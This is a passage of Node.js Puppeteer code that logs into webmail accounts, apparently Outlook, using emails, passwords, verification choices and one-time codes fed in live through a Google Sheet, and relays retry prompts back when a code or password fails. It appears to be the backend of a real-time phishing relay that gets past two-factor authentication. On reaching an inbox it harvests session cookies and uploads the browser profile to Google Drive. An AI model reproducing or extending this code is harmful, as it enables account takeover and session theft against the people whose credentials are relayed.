                                  status: "WAITINGOPTIONS", 
                                  viewName: currentActualViewName, 
                                  verificationOptions: currentVerificationOptions, 
                                  message: `Error processing choice: ${interactionError.message}` 
                              })
                          });
                      }
                  } else {
                      logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] No verificationChoice yet. Waiting...`);
                  }

              } catch (pollError) {
                  logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during polling: ${pollError.message}`);
                  await new Promise(resolve => setTimeout(resolve, 15000));
              }
              if (finalStatus === "WAITINGOPTIONS") {
                  await new Promise(resolve => setTimeout(resolve, 10000)); 
              }
          } 
          if (finalStatus === "WAITINGOPTIONS") {
              logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Polling for choice timed out. Setting status to FAILED.`);
              finalStatus = "FAILED";
              updateData.status = "FAILED";
              updateData.verified = true; // Account access achieved, verified but not full access (timeout on verification)
              updateData.fullAccess = false; // FAILED so fullAccess false
              updateData.lastJsonResponse = JSON.stringify({
                  ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                  message: "Failed during WAITINGOPTIONS phase: Choice not provided in time."
              });
              // Explicitly close browser and clean up immediately
              if (browser && !browserFullyClosed) {
                  if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                  await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGOPTIONS timeout: ${err.message}`));
                  browserFullyClosed = true;
                  activeBrowserSessions.delete(browserId);
                  await new Promise(resolve => setTimeout(resolve, 1000));
              }
              if (userDataDir) {
                  try {
                      logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGOPTIONS timeout: ${userDataDir}`);
                      await fs.remove(userDataDir);
                      logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                  } catch (deleteError) {
                      logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGOPTIONS timeout: ${deleteError.message}`);
                  }
              }
              return; // Exit processRow if choice not found
          }
          updateData.status = finalStatus; 
          if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
               updateData.lastJsonResponse = JSON.stringify({
                  ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", 
                  message: "Failed during WAITINGOPTIONS phase."
              });
          }
      } else if (currentSheetStatusFromRow === "WAITINGCODE") {
          logger.info(`[processRow][${browserId}] Resuming from WAITINGCODE state.`);
          if (updateData.status !== "WAITINGCODE") { 
            updateData.status = "WAITINGCODE";
            updateData.lastJsonResponse = JSON.stringify({
                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITINGCODE",
                verificationState: 'WAITING_CODE', 
                message: "Awaiting verification code."
            });
            await updateBrowserRowData(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
          }


          const pollingTimeout = Date.now() + 5 * 60 * 1000; 
          let codeSuccessfullyProcessed = false;

          while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") {
              try {
                  // Session Health Check
                  if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                      logger.error(`[processRow][${browserId}][WAITINGCODE] Page became unresponsive. Marking as FAILED.`);
                      finalStatus = "FAILED";
                      updateData.status = "FAILED";
                      updateData.lastJsonResponse = JSON.stringify({
                          ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                          message: "Failed during WAITINGCODE phase: Browser page became unresponsive."
                      });
                      break; // Exit polling loop
                  }

                  const checkData = await fetchDataFromAppScript(1, 30000, true); 
                  const checkHeaders = checkData[0];
                  const checkColumnIndexes = getColumnIndexes(checkHeaders);
                  const checkRows = checkData.slice(1);
                  const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                  if (!checkRow) {
                      logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
                      finalStatus = "FAILED"; 
                      break;
                  }

                  const currentSheetStatus = checkRow[columnIndexes['status']];
                  const verificationCode = checkRow[columnIndexes['verificationCode']];

                  if (currentSheetStatus !== "WAITINGCODE") {
                      logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                      finalStatus = currentSheetStatus; 
                      break;
                  }

                  if (verificationCode && String(verificationCode).trim() !== "") {
                      logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found: '${verificationCode}'. Setting status to PROCESSING.`);
                      await updateBrowserRowData(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification code" }) }); // Set status to PROCESSING
                      
                      const currentViewNameForCode = JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName;
                      let codeInputSelector;
                      let codeSubmitSelector;
                      let useEnterToSubmit = false;

                      if (currentViewNameForCode === 'Outlook Enter Code Fluent') {
                          codeInputSelector = platformConfig.selectors?.fluentCodeInput;
                          codeSubmitSelector = platformConfig.selectors?.fluentCodeSubmit; 
                          useEnterToSubmit = true; 
                          logger.info(`[processRow][${browserId}][WAITINGCODE] Using Fluent code input selectors. Input: ${codeInputSelector}, Will press Enter to submit.`);
                      } else {
                          codeInputSelector = platformConfig.selectors?.verificationCodeInput; 
                          codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
                          logger.info(`[processRow][${browserId}][WAITINGCODE] Using standard code input selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                      }

                      let codeEntryAttempted = false; 
                      if (codeInputSelector) { 
                          try {
                              await page.waitForSelector(codeInputSelector, { visible: true, timeout: 10000 });
                              await page.evaluate((sel) => { const el = document.querySelector(sel); if(el) el.value = ''; }, codeInputSelector);
                              await page.type(codeInputSelector, String(verificationCode), { delay: 50 }); 
                              logger.info(`[processRow][${browserId}][WAITINGCODE] Typed code into ${codeInputSelector}`);

                              const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 })
                                 .catch(e => logger.warn(`[processRow][${browserId}][WAITINGCODE] Navigation after code submit/Enter did not complete as expected or timed out: ${e.message}`));

                              if (useEnterToSubmit) {
                                  await page.keyboard.press('Enter');
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Pressed Enter to submit fluent code.`);
                              } else if (codeSubmitSelector) {
                                  await page.waitForSelector(codeSubmitSelector, { visible: true, timeout: 5000 });
                                  await page.click(codeSubmitSelector);
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Clicked code submit button: ${codeSubmitSelector}`);
                              } else {
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] No submit selector and not flagged to use Enter. Code typed, hoping for auto-submit.`);
                              }
                              
                              await navigationPromise; 
                              logger.info(`[processRow][${browserId}][WAITINGCODE] Waited after code submission attempt for page to settle.`);
                              codeEntryAttempted = true;

                          } catch (codeEntryError) {
                               logger.error(`[processRow][${browserId}][WAITINGCODE] Error during code entry/submission: ${codeEntryError.message}`);
                          }

                          if(codeEntryAttempted) { 
                            // Check for codeError immediately after submission
                            const codeErrorSelector = platformConfig.selectors?.codeError;
                            let codeErrorDetected = false;
                            if (codeErrorSelector) {
                                try {
                                    await page.waitForSelector(codeErrorSelector, { visible: true, timeout: 1000 }); // Short timeout for immediate check
                                    codeErrorDetected = true;
                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Code error detected via selector: ${codeErrorSelector}.`);
                                } catch (e) {
                                    // Selector not found, no immediate error
                                }
                            }

                            if (codeErrorDetected) {
                                logger.warn(`[processRow][${browserId}][WAITINGCODE] Incorrect code. Remaining on code entry screen.`);
                                await updateBrowserRowData(browserId, {
                                    status: "WAITINGCODE",
                                    verified: true,
                                    fullAccess: false,
                                    lastJsonResponse: JSON.stringify({
                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                        status: "WAITINGCODE",
                                        message: "Incorrect verification code entered. Please try again."
                                    })
                                });
                                continue; // Continue the WAITINGCODE polling loop
                            }

                            // If no code error, then wait 10 seconds and proceed with existing checks
                            await new Promise(res => setTimeout(res, 10000)); // Increased wait to 10 seconds as requested
                            await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification'); 
                          }
                          
                          let stillOnCodeEntryScreen = false;
                          let returnedToChoiceScreen = false;
                          
                          const postCodeVerificationState = await checkVerification(page, platformConfig);
                          if (postCodeVerificationState.required) {
                              if (postCodeVerificationState.type === 'code') {
                                  stillOnCodeEntryScreen = true;
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] Still on a code entry screen after submission attempt. Assuming code was incorrect.`);
                              } else if (postCodeVerificationState.type === 'choice' && platform === 'outlook') {
                                  returnedToChoiceScreen = true;
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] Returned to choice screen after code submission attempt for Outlook.`);
                              }
                          }

                          const inboxReachedAfterCode = await isInbox(page, platformConfig);

                          if (inboxReachedAfterCode) {
                              logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code entry. Setting status to COMPLETED.`);
                              finalStatus = "COMPLETED";
                              codeSuccessfullyProcessed = true;

                              const browserCookies = await page.cookies();
                              updateData.status = "COMPLETED";
                              updateData.cookieJSON = JSON.stringify(browserCookies);
                              updateData.verified = true; // Set verified to true on COMPLETED
                              updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
                              updateData.lastJsonResponse = JSON.stringify({
                                browserId, email, status: "COMPLETED",
                                emailExists: initialCheckResult.emailExists, accountAccess: true,
                                reachedInbox: true, requiresVerification: false,
                                verified: true, fullAccess: true, // Include in response
                                platform, timestamp: new Date().toISOString(),
                                message: "Successfully verified with code and reached inbox."
                              });
                              // updateData.verificationCode = ''; // Removed clearing

                              logger.info(`[processRow][${browserId}] COMPLETED status after code. Updating sheet before Drive upload.`);
                              await updateBrowserRowData(browserId, {
                                  status: "COMPLETED",
                                  verified: updateData.verified,
                                  fullAccess: updateData.fullAccess,
                                  cookieJSON: updateData.cookieJSON,
                                  lastJsonResponse: updateData.lastJsonResponse,
                                  // verificationCode: '' // Removed clearing
                              });
                              
                              if (browser) {
                                if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                                logger.info(`[processRow][${browserId}] Closing browser after successful verification.`);
                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                browserFullyClosed = true;
                                activeBrowserSessions.delete(browserId);
                                await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
                              }

                              let uploadedDriveUrlAfterCode = null;
                              try {
                                uploadedDriveUrlAfterCode = await uploadBrowserData(browserId);
                                if (uploadedDriveUrlAfterCode) {
                                  updateData.driveUrl = uploadedDriveUrlAfterCode;
                                }
                              } catch (uploadError) {
                                logger.error(`[processRow][${browserId}] Error during Google Drive upload after code: ${uploadError.message}`);
                              }
                              
                              if (updateData.driveUrl && userDataDir) {
                                try {
                                  await fs.remove(userDataDir);
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
                                } catch (deleteError) {
                                  logger.error(`[processRow][${browserId}][WAITINGCODE] Error deleting user data dir: ${deleteError.message}`);
                                }
                              }
                              break; 
                          } else {
                              logger.warn(`[processRow][${browserId}][WAITINGCODE] Code entered, but inbox not reached. Current URL: ${page.url()}`);
                              
                              if (returnedToChoiceScreen) { 
                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] Outlook: Returned to choice screen. Transitioning to WAITINGOPTIONS.`);
                                  finalStatus = "WAITINGOPTIONS";
                                  // Use the fresh options from postCodeVerificationState
                                  const freshOptionsFromLoopback = await platformConfig.extractVerificationOptions(page, platformConfig, postCodeVerificationState.viewName);
                                  updateData = {
                                      status: "WAITINGOPTIONS",
                                      verificationCode: '', // Re-added clearing as per user feedback
                                      verificationOptions: JSON.stringify(freshOptionsFromLoopback),
                                      lastJsonResponse: JSON.stringify({
                                          ...JSON.parse(updateData.lastJsonResponse || '{}'), 
                                          status: "WAITINGOPTIONS",
                                          message: "Incorrect code or issue, returned to verification options. Please choose again.",
                                          verificationState: 'WAITING_OPTIONS',
                                          verificationOptions: freshOptionsFromLoopback, 
                                          viewName: postCodeVerificationState.viewName 
                                      })
                                  };
                                  await updateBrowserRowData(browserId, updateData);
                                  codeSuccessfullyProcessed = false; 
                                  break; 
                              } else if (stillOnCodeEntryScreen) {
                                   logger.warn(`[processRow][${browserId}][WAITINGCODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITINGCODE.`);
                                await updateBrowserRowData(browserId, {
                                    status: "WAITINGCODE",
                                    verificationCode: '', // Clear the incorrect code
                                    lastJsonResponse: JSON.stringify({
                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                        status: "WAITINGCODE",
                                        message: "Incorrect verification code entered. Please try again."
                                    })
                                });
                              } else {
                                  logger.error(`[processRow][${browserId}][WAITINGCODE] Unexpected page state after code submission. Failing. Current URL: ${page.url()}`);
                                  finalStatus = "FAILED";
                                  codeSuccessfullyProcessed = false;
                                  break;
                              }
                          }
                      }  else { 
                        logger.error(`[processRow][${browserId}][WAITINGCODE] Verification code input/submit selectors not defined for platform ${platform}. Failing.`);
                        finalStatus = "FAILED"; 
                        break;
                      }
                  } else {
                      logger.debug(`[processRow][${browserId}][WAITINGCODE] No code found yet. Waiting...`);
                  }

              } catch (pollError) {
                  logger.error(`[processRow][${browserId}][WAITINGCODE] Error during polling: ${pollError.message}`);
                  await new Promise(resolve => setTimeout(resolve, 15000));
              }
              
              if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) { 
                 await new Promise(resolve => setTimeout(resolve, 10000));
              }
          } 

          if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) {
             logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out or failed. Setting status to FAILED.`);
             finalStatus = "FAILED";
             updateData.status = "FAILED";
             updateData.verified = true; // Account access achieved, verified but not full access (timeout on code)
             updateData.fullAccess = false; // FAILED so fullAccess false
             updateData.lastJsonResponse = JSON.stringify({
                 ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                 message: "Failed during WAITINGCODE phase: Code not provided in time or processing failed."
             });
             // Explicitly close browser and clean up immediately
             if (browser && !browserFullyClosed) {
                 if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                 await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGCODE timeout: ${err.message}`));
                 browserFullyClosed = true;
                 activeBrowserSessions.delete(browserId);
                 await new Promise(resolve => setTimeout(resolve, 1000));
             }
             if (userDataDir) {
                 try {
                     logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGCODE timeout: ${userDataDir}`);
                     await fs.remove(userDataDir);
                     logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                 } catch (deleteError) {
                     logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGCODE timeout: ${deleteError.message}`);
                 }
             }
             return; // Exit processRow if code not found or processing failed
          }
          
          updateData.status = finalStatus; 
          if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("COMPLETED")) { 
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", 
                    message: "Failed during WAITINGCODE phase."
                });
          } else if (finalStatus === "WAITINGOPTIONS") {
               updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITINGOPTIONS", 
                    message: "Incorrect code, returned to verification options."
                });
          }
          logger.info(`[processRow][${browserId}] Exited WAITINGCODE loop. Final status for sheet update: ${updateData.status}`);
      }

      logger.info(`[processRow][${browserId}] Result from checkAccountAccess: ${JSON.stringify(initialCheckResult)}`);
      
      // Determine finalStatus based on initialCheckResult and current state
      let currentVerificationOptions = initialCheckResult.verificationOptions || [];
      
      // If finalStatus was already set to FAILED within a polling loop (e.g., timeout, unresponsive page),
      // we should respect that and not overwrite it with a less severe status.
      // However, if it's still the default "FAILED" from initialization, we can update it.
      if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {
          finalStatus = "WAITINGEMAIL";
          updateData.lastJsonResponse = JSON.stringify({
              browserId, email, status: finalStatus,
              emailExists: initialCheckResult.emailExists,
              accountAccess: initialCheckResult.accountAccess,
              reachedInbox: initialCheckResult.reachedInbox,
              requiresVerification: initialCheckResult.requiresVerification,
              verificationState: initialCheckResult.verificationState,
              verificationOptions: currentVerificationOptions,
              platform, timestamp: new Date().toISOString(),
              message: initialCheckResult.message // Use the message from checkAccountAccess
          });
          // Clear the email field in the sheet when transitioning to WAITINGEMAIL
          // ensure the status is set before persisting so the final cleanup won't overwrite it
          updateData.status = finalStatus;
          await updateBrowserRowData(browserId, { ...updateData, email: '' });
          return; // Exit processRow to wait for updated email
      } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {
          finalStatus = "WAITINGPASSWORD";
          updateData.lastJsonResponse = JSON.stringify({
              browserId, email, status: finalStatus,
              emailExists: initialCheckResult.emailExists,
              accountAccess: initialCheckResult.accountAccess,
              reachedInbox: initialCheckResult.reachedInbox,
              requiresVerification: initialCheckResult.requiresVerification,
              verificationState: initialCheckResult.verificationState,
              verificationOptions: currentVerificationOptions,
              platform, timestamp: new Date().toISOString(),
              message: initialCheckResult.message // Use the message from checkAccountAccess
          });
          // Clear the password field in the sheet when transitioning to WAITINGPASSWORD
            // ensure the status is set before persisting so the final cleanup won't overwrite it
            updateData.status = finalStatus;
            await updateBrowserRowData(browserId, { ...updateData, password: '' });
          return; // Exit processRow to wait for updated password
    } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) { // Generic email error, email doesn't exist
          logger.info(`[processRow][${browserId}] Generic email error detected. Setting status to WAITINGEMAIL.`);
          finalStatus = "WAITINGEMAIL";
          updateData.lastJsonResponse = JSON.stringify({
              browserId,
              email,
              status: finalStatus,
              emailExists: initialCheckResult.emailExists,
              accountAccess: initialCheckResult.accountAccess,
              reachedInbox: initialCheckResult.reachedInbox,
              requiresVerification: initialCheckResult.requiresVerification,
              verificationState: initialCheckResult.verificationState || null,
              verificationOptions: currentVerificationOptions,
              platform,
              timestamp: new Date().toISOString(),
              message: initialCheckResult.message || "Email does not exist. Please provide a valid email."
          });
          // Clear the email field in the sheet when transitioning to WAITINGEMAIL
          // ensure the status is set before persisting so the final cleanup won't overwrite it
          updateData.status = finalStatus;
          await updateBrowserRowData(browserId, { ...updateData, email: '' });
          return; // Exit processRow to wait for updated email
      } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) { // Only update if initial FAILED and email exists
          if (initialCheckResult.verificationState === 'WAITING_PASSWORD') {
              finalStatus = "WAITINGPASSWORD";
              await updateBrowserRowData(browserId, { status: "WAITINGPASSWORD", verified: false, fullAccess: false });
          } else if (initialCheckResult.accountAccess) {
              if (!initialCheckResult.requiresVerification) {
                  if (initialCheckResult.reachedInbox) {
                      finalStatus = "COMPLETED";
                  } else {
                      logger.warn(`[processRow][${browserId}] Login successful but did not reach expected inbox state. Setting status to FAILED.`);
                      finalStatus = "FAILED";
                  }
              } else { 
                  if (initialCheckResult.verificationState === 'WAITING_OPTIONS') {
                      finalStatus = "WAITINGOPTIONS";
                  } else { 
                      finalStatus = "WAITINGCODE";
                  }
              }
          } else { 
              finalStatus = "FAILED"; // Account access failed even if email exists
          }
      } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED") { // If email doesn't exist and not already FAILED
          finalStatus = "FAILED";
      }
      // If finalStatus was already set to FAILED due to timeout/unresponsive page, it remains FAILED.
      // If initialCheckResult.emailExists is false, it will be FAILED.
      // Otherwise, it will be updated based on initialCheckResult.

      updateData = {
        status: finalStatus,
        lastJsonResponse: JSON.stringify({
            browserId, email, status: finalStatus,
            emailExists: initialCheckResult.emailExists,
            accountAccess: initialCheckResult.accountAccess,
            reachedInbox: initialCheckResult.reachedInbox,
            requiresVerification: initialCheckResult.requiresVerification,
            verificationState: initialCheckResult.verificationState,
            verificationOptions: currentVerificationOptions,
            platform, timestamp: new Date().toISOString(),
            message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.") // Preserve or add message
        })
      };
      
      if (finalStatus === "WAITINGOPTIONS") {
        updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
        await updateBrowserRowData(browserId, updateData);
        logger.info(`[processRow][${browserId}] Status set to WAITINGOPTIONS. Sheet updated with options.`);
      }


      if (finalStatus === "COMPLETED") {
        const browserCookies = await page.cookies();
        updateData.cookieJSON = JSON.stringify(browserCookies);
        updateData.verified = true; // Set verified to true on COMPLETED without verification
        updateData.fullAccess = true; // Set fullAccess to true on COMPLETED without verification

        logger.info(`[processRow][${browserId}] Initial COMPLETED status. Updating sheet before Drive upload.`);
        await updateBrowserRowData(browserId, {
            status: "COMPLETED",
            verified: updateData.verified,
            fullAccess: updateData.fullAccess,
            cookieJSON: updateData.cookieJSON,
            lastJsonResponse: updateData.lastJsonResponse
        });

        if (browser) {
          if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
          logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
          await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
          browserFullyClosed = true;
          activeBrowserSessions.delete(browserId);
          await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
        }

        let uploadedDriveUrl = null;
        try {
          uploadedDriveUrl = await uploadBrowserData(browserId);
          if (uploadedDriveUrl) {
            updateData.driveUrl = uploadedDriveUrl;
            logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
          } else {
            logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
          }
        } catch (uploadError) {
          logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
        }
        
        if (updateData.driveUrl && userDataDir) {
          try {
            logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
            await fs.remove(userDataDir);
            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
          } catch (deleteError) {
            logger.error(`[processRow][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
          }
        }
      }

      // The WAITINGOPTIONS and WAITINGCODE loops are already handled above in the main state handling logic.
      // This section is redundant and should be removed to avoid duplicate logic and potential issues.
      // The logic for these states should only be executed once within the main if/else if chain.
      // Removing the duplicate WAITINGOPTIONS and WAITINGCODE loops here.

    } catch (error) {
      logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
      updateData.status = "FAILED";
      updateData.verified = false; // FAILED so verified false
      updateData.fullAccess = false; // FAILED so fullAccess false
      updateData.lastJsonResponse = JSON.stringify({
            browserId, email, status: "FAILED", error: error.message,
            platform, timestamp: new Date().toISOString(),
            ...(initialCheckResult.emailExists !== undefined && {
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState
            })
      });
    } finally {
      if (browser && !browserFullyClosed) {
        const sessionTargetListener = isReusingBrowser ? activeBrowserSessions.get(browserId)?.targetCreatedListener : targetCreatedListener;
        if (sessionTargetListener && browser) { // Ensure listener exists before trying to remove
            try {
                browser.off('targetcreated', sessionTargetListener);
            } catch (offError) {
                logger.warn(`[processRow][${browserId}] Error removing targetcreated listener: ${offError.message}`);
            }
        }
        
        if (updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL") {
            logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
            activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
        } else {
            logger.info(`[processRow][${browserId}] Final cleanup - Closing browser (status: ${updateData.status})`);
            await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
            browserFullyClosed = true;
            activeBrowserSessions.delete(browserId); 
            await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
        }
      } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGPASSWORD")) {
        const session = activeBrowserSessions.get(browserId);
        if (session?.targetCreatedListener && session.browser) {
             try {
                session.browser.off('targetcreated', session.targetCreatedListener);
            } catch (offError) {
                logger.warn(`[processRow][${browserId}] Error removing targetcreated listener from reused session: ${offError.message}`);
            }
        }
        logger.info(`[processRow][${browserId}] Final cleanup (reused session) - Closing browser (status: ${updateData.status})`);
        await browser.close().catch(err => logger.error(`Error closing reused browser during cleanup for ${browserId}: ${err.message}`));
        browserFullyClosed = true;
        activeBrowserSessions.delete(browserId);
        await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
      }

      const finalSheetUpdate = { ...updateData }; 
      // Removed explicit clearing of verification fields as per user request
      // if (finalSheetUpdate.status === "COMPLETED") {
      //     finalSheetUpdate.verificationOptions = '';
      //     finalSheetUpdate.verificationChoice = '';
      //     finalSheetUpdate.verificationCode = '';
      // } else if (finalSheetUpdate.status === "WAITINGCODE") {
      //     finalSheetUpdate.verificationChoice = '';
      //     if (!finalSheetUpdate.hasOwnProperty('verificationCode')) {
      //         finalSheetUpdate.verificationCode = ''; 
      //     }
      // } else if (finalSheetUpdate.status === "WAITINGOPTIONS") {
      //     finalSheetUpdate.verificationCode = '';
      //     if (!finalSheetUpdate.hasOwnProperty('verificationChoice')) {
      //         finalSheetUpdate.verificationChoice = '';
      //     }
      //     if (!finalSheetUpdate.hasOwnProperty('verificationOptions')) {
      //         finalSheetUpdate.verificationOptions = '';
      //     }
      // }

      logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
      await updateBrowserRowData(browserId, finalSheetUpdate).catch(err => 
        logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
      );
      
      if (updateData.status === "FAILED" && userDataDir) {
        if (browserFullyClosed || (browser && !browser.isConnected())) { 
            try {
              logger.info(`[processRow][${browserId}] Final status FAILED. Attempting to delete user data directory: ${userDataDir}`);
              // Add retry logic for fs.remove to handle EBUSY errors
              // Add a small initial delay before attempting to delete, to allow browser process to fully exit
              await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second initial delay

              const maxRetries = 5; // Increased retries
              const delay = 2000; // Increased delay between retries to 2 seconds
              let attempt = 0;
              let deleted = false;
              while (attempt < maxRetries && !deleted) {
                try {
                  await fs.remove(userDataDir);
                  logger.info(`[processRow][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
                  deleted = true;
                } catch (deleteError) {
                  if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Also handle ENOTEMPTY
                    logger.warn(`[processRow][${browserId}] EBUSY/ENOTEMPTY deleting user data directory (attempt ${attempt + 1}/${maxRetries}): ${userDataDir}. Retrying in ${delay}ms...`);
                    await new Promise(resolve => setTimeout(resolve, delay));
                    attempt++;
                  } else {
                    logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
                    throw deleteError; // Re-throw if it's not EBUSY/ENOTEMPTY
                  }
                }
              }
              if (!deleted) {
                logger.error(`[processRow][${browserId}] Failed to delete user data directory after ${maxRetries} retries.`);
              }
            } catch (deleteError) {
              // This catch block will handle errors other than EBUSY/ENOTEMPTY that were re-thrown
              if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Should not happen if retry logic works, but as a fallback
                logger.warn(`[processRow][${browserId}] Final EBUSY/ENOTEMPTY error deleting user data directory: ${userDataDir}. This often means a previous browser process didn't fully exit.`);
              } else {
                logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
              }
            }
        } else {
             logger.warn(`[processRow][${browserId}] Final status FAILED, but session active. Skipping userDataDir deletion.`);
        }
      }
    }
}

// Helper function to check if the Puppeteer page is responsive
async function isPageResponsive(page, browserId, instanceId) {
    try {
        // Attempt a simple page evaluation to check responsiveness
        await page.evaluate(() => document.body.innerText);
        return true;
    } catch (e) {
        logger.error(`[isPageResponsive][${browserId}][${instanceId}] Page is unresponsive: ${e.message}`);
        return false;
    }
}


// Flag to prevent the interval timer from overlapping runs if a run takes longer than the interval
let isProcessingInterval = false;
let noNewRowsCount = 0; // Counter for consecutive checks with no new rows

async function processWaitingRows() {
  if (isProcessingInterval) {
    logger.debug("Interval check skipped: Previous run still in progress.");
    return;
  }
  isProcessingInterval = true;
  logger.info(`Interval check running. Active processes: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);

  try {
    const availableSlots = MAX_CONCURRENT_BROWSERS - activeProcesses.size;
    if (availableSlots <= 0) {
      logger.info("Concurrency limit reached. No available slots.");
      isProcessingInterval = false;
      return;
    }

    const data = await fetchDataFromAppScript(3, 120000, true);

    if (!Array.isArray(data) || data.length === 0) {
      logger.warn('Invalid or empty data fetched from App Script.');
      isProcessingInterval = false;
      return;
    }

    const headers = data[0];
    const columnIndexes = getColumnIndexes(headers);
    const rows = data.slice(1);

    const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE"];
    const rowsToInitiateProcessing = rows.filter(row => {
        const status = row[columnIndexes['status']];
        const bId = row[columnIndexes['browserId']];
        // Only initiate a new processRow call if the browserId is not currently active
        // AND its status is one that needs processing.
        return processableStatuses.includes(status) && !activeProcesses.has(bId);
    });

    const allProcessableRowsInSheet = rows.filter(row => {
        const status = row[columnIndexes['status']];
        return processableStatuses.includes(status);
    });

    if (allProcessableRowsInSheet.length === 0) {
